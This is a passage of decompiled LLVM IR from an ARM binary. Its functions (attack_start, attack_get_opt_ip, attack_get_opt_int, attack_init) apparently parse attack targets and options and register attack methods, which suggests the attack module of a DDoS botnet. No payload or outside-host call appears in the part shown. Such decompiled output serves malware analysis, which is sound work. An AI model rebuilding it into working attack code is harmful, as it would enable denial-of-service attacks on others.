  br label %dec_label_pc_83c0

dec_label_pc_83c0:                                ; preds = %dec_label_pc_83c0, %dec_label_pc_83a0
  %v1_83c4 = phi i32 [ %v1_83f0, %dec_label_pc_83c0 ], [ %v2_83ac, %dec_label_pc_83a0 ]
  %v0_83c0 = phi i32 [ %v1_83ec, %dec_label_pc_83c0 ], [ %v1_83bc, %dec_label_pc_83a0 ]
  %v1_83c0 = add i32 %v0_83c0, -5
  %v2_83c0 = inttoptr i32 %v1_83c0 to i32*
  %v3_83c0 = load i32, i32* %v2_83c0, align 4
  store i32 %v3_83c0, i32* %r1.global-to-local, align 4
  %v2_83c4 = add i32 %v1_83c4, 16
  %v3_83c4 = inttoptr i32 %v2_83c4 to i32*
  store i32 %v3_83c0, i32* %v3_83c4, align 4
  %v0_83c8 = load i32, i32* @r7, align 4
  %v1_83c8 = add i32 %v0_83c8, -6
  store i32 %v1_83c8, i32* %r3.global-to-local, align 4
  %v0_83cc = load i32, i32* %r0.global-to-local, align 4
  %v1_83cc = add i32 %v0_83cc, -1
  %v2_83cc = inttoptr i32 %v1_83cc to i8*
  %v3_83cc = load i8, i8* %v2_83cc, align 1
  %v4_83cc = zext i8 %v3_83cc to i32
  store i32 %v4_83cc, i32* %r2.global-to-local, align 4
  %v0_83d0 = load i32, i32* @r6, align 4
  %v1_83d0 = add i32 %v0_83d0, -5
  store i32 %v1_83d0, i32* @r6, align 4
  %v9_83d4 = icmp eq i32 %v1_83d0, %v1_83c8
  store i1 %v9_83d4, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_83cc, i32* @r4, align 4
  %v2_83e0 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e0 = add i32 %v2_83e0, 20
  %v4_83e0 = inttoptr i32 %v3_83e0 to i8*
  store i8 %v3_83cc, i8* %v4_83e0, align 1
  %v0_83e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_83e4 = load i32, i32* %ip.global-to-local, align 4
  %v2_83e4 = add i32 %v1_83e4, 4
  %v3_83e4 = inttoptr i32 %v2_83e4 to i32*
  store i32 %v0_83e4, i32* %v3_83e4, align 4
  %v0_83e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_83e8 = trunc i32 %v0_83e8 to i16
  %v2_83e8 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e8 = inttoptr i32 %v2_83e8 to i16*
  store i16 %v1_83e8, i16* %v3_83e8, align 2
  %v0_83ec = load i32, i32* %r0.global-to-local, align 4
  %v1_83ec = add i32 %v0_83ec, 5
  store i32 %v1_83ec, i32* %r0.global-to-local, align 4
  %v0_83f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_83f0 = add i32 %v0_83f0, 24
  store i32 %v1_83f0, i32* %ip.global-to-local, align 4
  %v0_83f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83f4, label %dec_label_pc_83f8, label %dec_label_pc_83c0

dec_label_pc_83f8:                                ; preds = %dec_label_pc_83c0
  %v0_83f8 = load i32, i32* @r6, align 4
  %v2_83f8 = icmp eq i32 %v0_83f8, 0
  store i1 %v2_83f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_83f8, label %dec_label_pc_84fc, label %dec_label_pc_8400

dec_label_pc_8400:                                ; preds = %dec_label_pc_83f8
  %v0_8400 = load i32, i32* @r4, align 4
  %v1_8400 = inttoptr i32 %v0_8400 to i8*
  %v2_8400 = load i8, i8* %v1_8400, align 1
  %v3_8400 = zext i8 %v2_8400 to i32
  store i32 %v3_8400, i32* @r5, align 4
  %v2_8404 = icmp eq i8 %v2_8400, 0
  store i1 %v2_8404, i1* %cpsr_z.global-to-local, align 1
  %v0_8408 = load i32, i32* @r7, align 4
  %v1_8408 = add i32 %v0_8408, -7
  store i32 %v1_8408, i32* @r8, align 4
  br i1 %v2_8404, label %bb, label %dec_label_pc_8414

bb:                                               ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* @r6, align 4
  br label %dec_label_pc_84d8

dec_label_pc_8414:                                ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_841c = call i32 @calloc(i32 %v3_8400, i32 8)
  store i32 %v2_841c, i32* %r0.global-to-local, align 4
  %v0_8420 = load i32, i32* @r8, align 4
  %v2_8420 = icmp eq i32 %v0_8420, 0
  store i1 %v2_8420, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_841c, i32* @r6, align 4
  br i1 %v2_8420, label %dec_label_pc_84fc, label %dec_label_pc_842c

dec_label_pc_842c:                                ; preds = %dec_label_pc_8414
  %v0_842c = load i32, i32* @r4, align 4
  %v1_842c = add i32 %v0_842c, 1
  %v2_842c = inttoptr i32 %v1_842c to i8*
  %v3_842c = load i8, i8* %v2_842c, align 1
  %v0_8430 = load i32, i32* @r7, align 4
  %v7_8430 = icmp eq i32 %v0_8430, 8
  store i1 %v7_8430, i1* %cpsr_z.global-to-local, align 1
  %v3_8434 = add i32 %v2_841c, 4
  %v4_8434 = inttoptr i32 %v3_8434 to i8*
  store i8 %v3_842c, i8* %v4_8434, align 1
  %v0_8438 = load i32, i32* @r4, align 4
  %v1_8438 = add i32 %v0_8438, 1
  store i32 %v1_8438, i32* %r3.global-to-local, align 4
  %v0_843c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_843c, label %dec_label_pc_84fc, label %dec_label_pc_8440

dec_label_pc_8440:                                ; preds = %dec_label_pc_842c
  %v1_8440 = add i32 %v0_8438, 2
  %v2_8440 = inttoptr i32 %v1_8440 to i8*
  %v3_8440 = load i8, i8* %v2_8440, align 1
  %v4_8440 = zext i8 %v3_8440 to i32
  store i32 %v4_8440, i32* @r4, align 4
  %v0_8444 = load i32, i32* @r7, align 4
  %v1_8444 = add i32 %v0_8444, -9
  store i32 %v1_8444, i32* @r8, align 4
  %v9_8448 = icmp eq i32 %v1_8444, %v4_8440
  store i1 %v9_8448, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8440, i32* %r1.global-to-local, align 4
  %v5_8450 = icmp slt i32 %v1_8444, %v4_8440
  br i1 %v5_8450, label %dec_label_pc_84fc, label %bb35

bb35:                                             ; preds = %dec_label_pc_8440
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_84547 = add i32 %v0_8438, 3
  store i32 %v7_84547, i32* @r7, align 4
  %v6_8458 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_8458, i32* @sl, align 4
  br label %dec_label_pc_849c

dec_label_pc_8468:                                ; preds = %dec_label_pc_849c
  %v0_8468 = load i32, i32* @r8, align 4
  %v1_8468 = load i32, i32* @r4, align 4
  %v2_8468 = sub i32 %v0_8468, %v1_8468
  store i32 %v2_8468, i32* %r2.global-to-local, align 4
  %v9_8468 = icmp eq i32 %v0_8468, %v1_8468
  store i1 %v9_8468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8468, label %dec_label_pc_84fc, label %dec_label_pc_8470

dec_label_pc_8470:                                ; preds = %dec_label_pc_8468
  %v1_8470 = load i32, i32* @r7, align 4
  %v2_8470 = add i32 %v1_8470, %v1_8468
  %v3_8470 = inttoptr i32 %v2_8470 to i8*
  %v4_8470 = load i8, i8* %v3_8470, align 1
  store i32 %v2_8470, i32* %r0.global-to-local, align 4
  %v1_8478 = add i32 %v2_8468, -1
  store i32 %v1_8478, i32* %r2.global-to-local, align 4
  %v7_8478 = icmp eq i32 %v2_8468, 1
  store i1 %v7_8478, i1* %cpsr_z.global-to-local, align 1
  %v3_847c = add i32 %v2_84d0, 4
  %v4_847c = inttoptr i32 %v3_847c to i8*
  store i8 %v4_8470, i8* %v4_847c, align 1
  %v0_8480 = load i32, i32* %r0.global-to-local, align 4
  %v1_8480 = add i32 %v0_8480, 1
  store i32 %v1_8480, i32* %r3.global-to-local, align 4
  %v0_8484 = load i32, i32* %r2.global-to-local, align 4
  %v1_8484 = add i32 %v0_8484, -1
  store i32 %v1_8484, i32* @r8, align 4
  %v1_8488 = add i32 %v0_8480, 2
  store i32 %v1_8488, i32* @r7, align 4
  %v0_848c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_848c, label %dec_label_pc_84fc, label %dec_label_pc_8490

dec_label_pc_8490:                                ; preds = %dec_label_pc_8470
  %v2_8490 = inttoptr i32 %v1_8480 to i8*
  %v3_8490 = load i8, i8* %v2_8490, align 1
  %v4_8490 = zext i8 %v3_8490 to i32
  store i32 %v4_8490, i32* @r4, align 4
  %v2_8494 = sub i32 %v1_8484, %v4_8490
  %tmp36 = sub i32 0, %v2_8494
  %v6_8494 = and i32 %v1_8484, %tmp36
  %v7_8494 = icmp slt i32 %v6_8494, 0
  %v8_8494 = icmp slt i32 %v2_8494, 0
  %v9_8494 = icmp eq i32 %v1_8484, %v4_8490
  store i1 %v9_8494, i1* %cpsr_z.global-to-local, align 1
  %v2_8498 = xor i1 %v8_8494, %v7_8494
  br i1 %v2_8498, label %dec_label_pc_84fc, label %dec_label_pc_849c

dec_label_pc_849c:                                ; preds = %bb35, %dec_label_pc_8490
  %v0_84a0 = phi i32 [ %v4_8440, %bb35 ], [ %v4_8490, %dec_label_pc_8490 ]
  %stack_var_-48.1 = phi i32 [ 0, %bb35 ], [ %v1_84b0, %dec_label_pc_8490 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_84a0 = add nuw nsw i32 %v0_84a0, 1
  store i32 %v1_84a0, i32* %r0.global-to-local, align 4
  %v2_84a4 = call i32 @calloc(i32 %v1_84a0, i32 1)
  store i32 %v2_84a4, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-48.1, i32* %r3.global-to-local, align 4
  %v1_84ac = load i32, i32* @sl, align 4
  %v2_84ac = inttoptr i32 %v1_84ac to i32*
  store i32 %v2_84a4, i32* %v2_84ac, align 4
  %v0_84b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_84b0 = add i32 %v0_84b0, 1
  store i32 %v1_84b0, i32* %r3.global-to-local, align 4
  %v0_84b4 = load i32, i32* @r4, align 4
  store i32 %v0_84b4, i32* %r2.global-to-local, align 4
  %v0_84b8 = load i32, i32* @r7, align 4
  store i32 %v0_84b8, i32* %r1.global-to-local, align 4
  %v3_84c0 = call i32 @util_memcpy(i32 %v2_84a4, i32 %v0_84b8, i32 %v0_84b4)
  store i32 %v3_84c0, i32* %r0.global-to-local, align 4
  store i32 %v1_84b0, i32* %r2.global-to-local, align 4
  %v3_84c8 = mul i32 %v1_84b0, 8
  store i32 %v3_84c8, i32* %r3.global-to-local, align 4
  %v1_84cc = load i32, i32* @r5, align 4
  %v9_84cc = icmp eq i32 %v1_84b0, %v1_84cc
  store i1 %v9_84cc, i1* %cpsr_z.global-to-local, align 1
  %v0_84d0 = load i32, i32* @r6, align 4
  %v2_84d0 = add i32 %v0_84d0, %v3_84c8
  store i32 %v2_84d0, i32* @sl, align 4
  br i1 %v9_84cc, label %dec_label_pc_84d8, label %dec_label_pc_8468

dec_label_pc_84d8:                                ; preds = %dec_label_pc_849c, %bb
  %v0_84d8 = call i32 @__GI___errno_location()
  %v2_84e0 = inttoptr i32 %v0_84d8 to i32*
  store i32 0, i32* %v2_84e0, align 4
  store i32 %v4_8370, i32* %r1.global-to-local, align 4
  %v0_84e8 = load i32, i32* @fp, align 4
  store i32 %v0_84e8, i32* %r0.global-to-local, align 4
  %v0_84ec = load i32, i32* @sb, align 4
  store i32 %v0_84ec, i32* %r2.global-to-local, align 4
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_84f4 = load i32, i32* @r5, align 4
  %v5_84f4 = load i32, i32* @r6, align 4
  %v6_84f8 = trunc i32 %v2_84f4 to i8
  %v7_84f8 = call i32 @attack_start(i32 %v0_84e8, i32 %v4_8370, i32 %v0_84ec, i32 %v2_83ac, i8 %v6_84f8, i32 %v5_84f4)
  store i32 %v7_84f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_84fc

dec_label_pc_84fc:                                ; preds = %dec_label_pc_8490, %dec_label_pc_8470, %dec_label_pc_8468, %dec_label_pc_8440, %dec_label_pc_842c, %dec_label_pc_8414, %dec_label_pc_83f8, %dec_label_pc_84d8
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_8500 = icmp eq i32 %v2_83ac, 0
  store i1 %v2_8500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8500, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_84fc
  store i32 %v2_83ac, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_84fc, %bb37
  store i32 34060, i32* @lr, align 4
  %v1_8508 = xor i1 %v2_8500, true
  call void @__pseudo_cond_branch(i1 %v1_8508, i32 ptrtoint (i32* @global_var_1310c.34 to i32))
  %v0_850c = load i32, i32* @r6, align 4
  %v2_850c = icmp eq i32 %v0_850c, 0
  store i1 %v2_850c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_850c, label %.dec_label_pc_8340_crit_edge, label %dec_label_pc_8514

.dec_label_pc_8340_crit_edge:                     ; preds = %bb38
  %v1_8348.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

dec_label_pc_8514:                                ; preds = %bb38
  %v0_8514 = load i32, i32* @r5, align 4
  %v2_8514 = icmp eq i32 %v0_8514, 0
  store i1 %v2_8514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8514, label %dec_label_pc_8538, label %dec_label_pc_851c

dec_label_pc_851c:                                ; preds = %dec_label_pc_8514
  br label %dec_label_pc_8520

dec_label_pc_8520:                                ; preds = %dec_label_pc_8520, %dec_label_pc_851c
  %v0_8528 = phi i32 [ 0, %dec_label_pc_851c ], [ %v1_8530, %dec_label_pc_8520 ]
  %v0_8520 = phi i32 [ %v0_850c, %dec_label_pc_851c ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  %v4_8520 = mul i32 %v0_8528, 8
  %v5_8520 = add i32 %v4_8520, %v0_8520
  %v6_8520 = inttoptr i32 %v5_8520 to i32*
  %v7_8520 = load i32, i32* %v6_8520, align 4
  store i32 %v7_8520, i32* %r0.global-to-local, align 4
  %v2_8524 = icmp eq i32 %v7_8520, 0
  store i1 %v2_8524, i1* %cpsr_z.global-to-local, align 1
  %v1_8528 = add i32 %v0_8528, 1
  store i32 %v1_8528, i32* @r4, align 4
  store i32 34096, i32* @lr, align 4
  %v1_852c = xor i1 %v2_8524, true
  call void @__pseudo_cond_branch(i1 %v1_852c, i32 ptrtoint (i32* @global_var_1310c.34 to i32))
  %v0_8530 = load i32, i32* @r5, align 4
  %v1_8530 = load i32, i32* @r4, align 4
  %v9_8530 = icmp eq i32 %v0_8530, %v1_8530
  store i1 %v9_8530, i1* %cpsr_z.global-to-local, align 1
  %v0_8538.pre = load i32, i32* @r6, align 4
  br i1 %v9_8530, label %dec_label_pc_8538, label %dec_label_pc_8520

dec_label_pc_8538:                                ; preds = %dec_label_pc_8520, %dec_label_pc_8514
  %v0_8538 = phi i32 [ %v0_850c, %dec_label_pc_8514 ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  store i32 %v0_8538, i32* @r0, align 4
  %v0_853c = call i32 @free()
  store i32 %v0_853c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

; uselistorder directives
  uselistorder i32 %v0_853c, { 1, 0 }
  uselistorder i32 %v1_8530, { 1, 0 }
  uselistorder i1 %v2_8500, { 0, 2, 1 }
  uselistorder i32 %v2_84d0, { 1, 0 }
  uselistorder i32 %v3_84c8, { 1, 0 }
  uselistorder i32 %v1_84b0, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_8494, { 1, 0 }
  uselistorder i32 %v4_8490, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8484, { 2, 0, 1, 3 }
  uselistorder i32 %v3_8400, { 1, 0, 2, 3 }
  uselistorder i32 %v1_83f0, { 1, 0 }
  uselistorder i32 %v1_83ec, { 1, 0 }
  uselistorder i32 %v2_83ac, { 0, 4, 5, 2, 3, 1, 6 }
  uselistorder i32 %v4_8380, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8350, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_834c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_8338, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 5, 6, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 6, 2, 3, 4, 0, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 17, 3, 6, 5, 9, 11, 10, 7, 8, 18, 19, 12, 13, 14, 15, 16, 20, 21, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_84fc, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_849c, { 1, 0 }
  uselistorder label %dec_label_pc_8340, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @attack_get_opt_ip(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_8544 = icmp eq i32 %arg1, 0
  %v3_8548 = load i32, i32* @r4, align 4
  store i32 %v3_8548, i32* %stack_var_-8, align 4
  %v6_8548 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_8544, label %dec_label_pc_858c, label %dec_label_pc_8554

dec_label_pc_8554:                                ; preds = %entry
  %v0_8554 = load i32, i32* %r1.global-to-local, align 4
  %v1_8554 = add i32 %v0_8554, 4
  %v2_8554 = inttoptr i32 %v1_8554 to i8*
  %v3_8554 = load i8, i8* %v2_8554, align 1
  %v4_8554 = zext i8 %v3_8554 to i32
  %v9_8558 = icmp eq i32 %v4_8554, %arg3
  br i1 %v9_8558, label %dec_label_pc_8598, label %dec_label_pc_857c.preheader

dec_label_pc_857c.preheader:                      ; preds = %dec_label_pc_8554
  br label %dec_label_pc_857c

dec_label_pc_856c:                                ; preds = %dec_label_pc_857c
  %v1_856c = add i32 %v0_8574.in, 12
  %v2_856c = inttoptr i32 %v1_856c to i8*
  %v3_856c = load i8, i8* %v2_856c, align 1
  %v4_856c = zext i8 %v3_856c to i32
  %v9_8570 = icmp eq i32 %v4_856c, %arg3
  br i1 %v9_8570, label %dec_label_pc_8598, label %dec_label_pc_857c

dec_label_pc_857c:                                ; preds = %dec_label_pc_857c.preheader, %dec_label_pc_856c
  %v0_8574.in = phi i32 [ %v0_8554, %dec_label_pc_857c.preheader ], [ %v0_8574, %dec_label_pc_856c ]
  %v0_857c = phi i32 [ 0, %dec_label_pc_857c.preheader ], [ %v1_857c, %dec_label_pc_856c ]
  %v0_8574 = add i32 %v0_8574.in, 8
  %v1_857c = add i32 %v0_857c, 1
  %v9_8580 = icmp eq i32 %v1_857c, %arg1
  store i32 %v0_8574, i32* %r1.global-to-local, align 4
  br i1 %v9_8580, label %dec_label_pc_858c, label %dec_label_pc_856c

dec_label_pc_858c:                                ; preds = %dec_label_pc_857c, %dec_label_pc_8598, %entry, %dec_label_pc_85a4
  %v2_8590 = phi i32 [ %v3_8548, %dec_label_pc_8598 ], [ %v3_8548, %entry ], [ %v2_8590.pre, %dec_label_pc_85a4 ], [ %v3_8548, %dec_label_pc_857c ]
  %v0_858c = phi i32 [ %arg4, %dec_label_pc_8598 ], [ %arg4, %entry ], [ %v1_85a4, %dec_label_pc_85a4 ], [ %arg4, %dec_label_pc_857c ]
  store i32 %v2_8590, i32* @r4, align 4
  store i32 %v6_8548, i32* @lr, align 4
  ret i32 %v0_858c

dec_label_pc_8598:                                ; preds = %dec_label_pc_856c, %dec_label_pc_8554
  %v0_8598 = phi i32 [ %v0_8554, %dec_label_pc_8554 ], [ %v0_8574, %dec_label_pc_856c ]
  %v1_8598 = inttoptr i32 %v0_8598 to i32*
  %v2_8598 = load i32, i32* %v1_8598, align 4
  store i32 %v2_8598, i32* @r0, align 4
  %v2_859c = icmp eq i32 %v2_8598, 0
  br i1 %v2_859c, label %dec_label_pc_858c, label %dec_label_pc_85a4

dec_label_pc_85a4:                                ; preds = %dec_label_pc_8598
  %v1_85a4 = call i32 @inet_addr(i32 %v2_8598)
  %v2_8590.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_858c

; uselistorder directives
  uselistorder i32 %v1_857c, { 1, 0 }
  uselistorder i32 %v0_8574, { 1, 0, 2 }
  uselistorder i32 %v0_8574.in, { 1, 0 }
  uselistorder i32 %v0_8554, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_858c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_857c, { 1, 0 }
}

define i32 @attack_get_opt_int(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_85b0 = icmp eq i32 %arg1, 0
  %v3_85b4 = load i32, i32* @r4, align 4
  store i32 %v3_85b4, i32* %stack_var_-8, align 4
  %v6_85b4 = load i32, i32* @lr, align 4
  br i1 %v2_85b0, label %dec_label_pc_85f8, label %dec_label_pc_85c0

dec_label_pc_85c0:                                ; preds = %entry
  %v0_85c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_85c0 = add i32 %v0_85c0, 4
  %v2_85c0 = inttoptr i32 %v1_85c0 to i8*
  %v3_85c0 = load i8, i8* %v2_85c0, align 1
  %v4_85c0 = zext i8 %v3_85c0 to i32
  %v9_85c4 = icmp eq i32 %v4_85c0, %arg3
  br i1 %v9_85c4, label %dec_label_pc_8604, label %dec_label_pc_85e8.preheader

dec_label_pc_85e8.preheader:                      ; preds = %dec_label_pc_85c0
  br label %dec_label_pc_85e8

dec_label_pc_85d8:                                ; preds = %dec_label_pc_85e8
  %v1_85d8 = add i32 %v0_85e0.in, 12
  %v2_85d8 = inttoptr i32 %v1_85d8 to i8*
  %v3_85d8 = load i8, i8* %v2_85d8, align 1
  %v4_85d8 = zext i8 %v3_85d8 to i32
  %v9_85dc = icmp eq i32 %v4_85d8, %arg3
  br i1 %v9_85dc, label %dec_label_pc_8604, label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %dec_label_pc_85e8.preheader, %dec_label_pc_85d8
  %v0_85e0.in = phi i32 [ %v0_85c0, %dec_label_pc_85e8.preheader ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v0_85e8 = phi i32 [ 0, %dec_label_pc_85e8.preheader ], [ %v1_85e8, %dec_label_pc_85d8 ]
  %v0_85e0 = add i32 %v0_85e0.in, 8
  %v1_85e8 = add i32 %v0_85e8, 1
  %v9_85ec = icmp eq i32 %v1_85e8, %arg1
  store i32 %v0_85e0, i32* %r1.global-to-local, align 4
  br i1 %v9_85ec, label %dec_label_pc_85f8, label %dec_label_pc_85d8

dec_label_pc_85f8:                                ; preds = %dec_label_pc_85e8, %dec_label_pc_8604, %entry, %dec_label_pc_8610
  %v2_85fc = phi i32 [ %v3_85b4, %dec_label_pc_8604 ], [ %v3_85b4, %entry ], [ %v2_85fc.pre, %dec_label_pc_8610 ], [ %v3_85b4, %dec_label_pc_85e8 ]
  %v0_85f8 = phi i32 [ %arg4, %dec_label_pc_8604 ], [ %arg4, %entry ], [ %v3_8614, %dec_label_pc_8610 ], [ %arg4, %dec_label_pc_85e8 ]
  store i32 %v2_85fc, i32* @r4, align 4
  store i32 %v6_85b4, i32* @lr, align 4
  ret i32 %v0_85f8

dec_label_pc_8604:                                ; preds = %dec_label_pc_85d8, %dec_label_pc_85c0
  %v0_8604 = phi i32 [ %v0_85c0, %dec_label_pc_85c0 ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v1_8604 = inttoptr i32 %v0_8604 to i32*
  %v2_8604 = load i32, i32* %v1_8604, align 4
  %v2_8608 = icmp eq i32 %v2_8604, 0
  br i1 %v2_8608, label %dec_label_pc_85f8, label %dec_label_pc_8610

dec_label_pc_8610:                                ; preds = %dec_label_pc_8604
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_8614 = inttoptr i32 %v2_8604 to i8*
  %v3_8614 = call i32 @util_atoi(i8* %v2_8614, i32 10)
  %v2_85fc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_85f8

; uselistorder directives
  uselistorder i32 %v1_85e8, { 1, 0 }
  uselistorder i32 %v0_85e0, { 1, 0, 2 }
  uselistorder i32 %v0_85e0.in, { 1, 0 }
  uselistorder i32 %v0_85c0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_85f8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_85e8, { 1, 0 }
}

define i32 @attack_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_8620 = load i32, i32* @r4, align 4
  store i32 %v3_8620, i32* %stack_var_-24, align 4
  %v6_8620 = load i32, i32* @r5, align 4
  %v9_8620 = load i32, i32* @r6, align 4
  %v12_8620 = load i32, i32* @r7, align 4
  %v15_8620 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_862c = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_21f2c.30 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_21f30.32 to i32), i32* @r6, align 4
  store i32 47272, i32* %r2.global-to-local, align 4
  store i32 %v2_862c, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_21f2d.38 to i32), i32* %r1.global-to-local, align 4
  %v2_864c = load i32, i32* @global_var_21f30.32, align 4
  %v2_8650 = inttoptr i32 %v2_862c to i32*
  store i32 47272, i32* %v2_8650, align 4
  %v3_8654 = load i32, i32* @r5, align 4
  %v4_8654 = add i32 %v3_8654, 4
  %v5_8654 = inttoptr i32 %v4_8654 to i8*
  store i8 0, i8* %v5_8654, align 1
  %v0_8658 = load i32, i32* %r1.global-to-local, align 4
  %v3_8658 = mul i32 %v0_8658, 4
  store i32 %v3_8658, i32* %r1.global-to-local, align 4
  %v5_865c = inttoptr i32 %v2_864c to i32*
  %v6_865c = call i32 @realloc(i32* %v5_865c, i32 %v3_8658, i32 47272, i32 0)
  %v2_8660 = load i8, i8* bitcast (i8** @global_var_21f2c.30 to i8*), align 4
  %v3_8660 = zext i8 %v2_8660 to i32
  store i32 %v6_865c, i32* %r2.global-to-local, align 4
  %v0_8668 = load i32, i32* @r5, align 4
  %v5_8668 = mul nuw nsw i32 %v3_8660, 4
  %v6_8668 = add i32 %v5_8668, %v6_865c
  %v7_8668 = inttoptr i32 %v6_8668 to i32*
  store i32 %v0_8668, i32* %v7_8668, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_21f2d.38 to i32), i32* %r3.global-to-local, align 4
  %v1_8678 = load i32, i32* @r6, align 4
  %v2_8678 = inttoptr i32 %v1_8678 to i32*
  store i32 %v6_865c, i32* %v2_8678, align 4
  %v0_867c = load i32, i32* %r3.global-to-local, align 4
  %v1_867c = trunc i32 %v0_867c to i8
  %v2_867c = load i32, i32* @r4, align 4
  %v3_867c = inttoptr i32 %v2_867c to i8*
  store i8 %v1_867c, i8* %v3_867c, align 1
  %v2_8680 = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_bd94.40 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r8, align 4
  store i32 %v2_8680, i32* @r5, align 4
  store i32 ptrtoint (i8* @global_var_21f2d.38 to i32), i32* %r1.global-to-local, align 4
  %v2_8698 = load i32, i32* @global_var_21f30.32, align 4
  %v2_869c = inttoptr i32 %v2_8680 to i32*
  store i32 ptrtoint (i32* @global_var_bd94.40 to i32), i32* %v2_869c, align 4
  %v0_86a0 = load i32, i32* @r8, align 4
  %v1_86a0 = trunc i32 %v0_86a0 to i8
  %v2_86a0 = load i32, i32* @r5, align 4
  %v3_86a0 = add i32 %v2_86a0, 4
  %v4_86a0 = inttoptr i32 %v3_86a0 to i8*
  store i8 %v1_86a0, i8* %v4_86a0, align 1
  %v0_86a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_86a4 = mul i32 %v0_86a4, 4
  store i32 %v3_86a4, i32* %r1.global-to-local, align 4
  %v4_86a8 = inttoptr i32 %v2_8698 to i32*
  %v5_86a8 = call i32 @realloc(i32* %v4_86a8, i32 %v3_86a4, i32 %v6_865c, i32 ptrtoint (i32* @global_var_bd94.40 to i32))
  %v2_86ac = load i8, i8* bitcast (i8** @global_var_21f2c.30 to i8*), align 4
  %v3_86ac = zext i8 %v2_86ac to i32
  store i32 %v3_86ac, i32* %r3.global-to-local, align 4
  store i32 %v5_86a8, i32* %r2.global-to-local, align 4
  %v0_86b4 = load i32, i32* @r5, align 4
  %v5_86b4 = mul nuw nsw i32 %v3_86ac, 4
